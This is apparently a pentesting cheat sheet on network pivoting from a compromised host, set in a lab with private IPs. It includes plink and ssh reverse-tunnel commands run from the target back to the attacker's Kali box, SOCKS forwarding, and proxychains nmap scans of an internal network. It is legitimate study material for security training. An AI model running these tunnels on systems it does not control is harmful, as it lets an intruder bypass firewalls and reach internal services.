
The Attacking Box (Kali Linux)   
IP: 192.168.1.16    

The pivot host (Windows XP) or linux     
User: lowuser   
FIRST IP: 192.168.1.30     
SECOND IP: 10.0.0.2    

Web server    
IP: 10.0.0.10     

# Port Forwarding
 
Plink.exe is Windows binary for ssh can be found at:   
`/usr/share/windows-resources/binaries/plink.exe`   

### Remote Forwarding

Goal: To get to server at 10.0.0.10

From Target   
`plink -P 22 -C -R 127.0.0.1:4444:10.0.0.10:80 root@192.168.1.16`   
`ssh -p 22  -R 127.0.0.1:4444:10.0.0.10:80 root@192.168.1.16`

From Kali   
`curl 127.0.0.1:4444`

### Local Forwarding

Firewall rule blocking 3389

From Target   
`plink -P 22 -C -L 192.168.1.30:3390:192.168.1.30:3389 root@192.168.1.16`   
`ssh -p 22 -L 192.168.1.30:3390:192.168.1.30:3389 root@192.168.1.16`

From Kali   
`rdesktop 192.168.1.30:3390`

Other Local Forwarding methods   

From Kali   
`ssh -f -N -L 3390:10.0.0.10:3389 lowuser@192.168.1.30`   
`rdesktop localhost:3390`


### Dynamic Forwarding

Firewall only allows inbound port 2222 and 80

From target    
`plink -P 22 -N -C -R 2222:127.0.0.1:22 root@192.168.1.16`    
`ssh -f -N -R 2222:127.0.0.1:22 root@192.168.1.16`

From Kali   
`ssh -f -N -D 127.0.0.1:8080 -p 2222 lowuser@127.0.0.1`

`vi /etc/proxychains.conf`   
`socks4   127.0.0.1   8080`

`proxychains nmap -sT -Pn <IP>`

Other Dynamic Forwarding   

From Kali   
`ssh -f -N -D 8080 lowuser@192.168.1.30`

### Other tools

HTTPTunnel   

stunnel 

socat

Reference:   
https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/   
https://technostuff.blogspot.com/2008/10/some-useful-socat-commands.html    
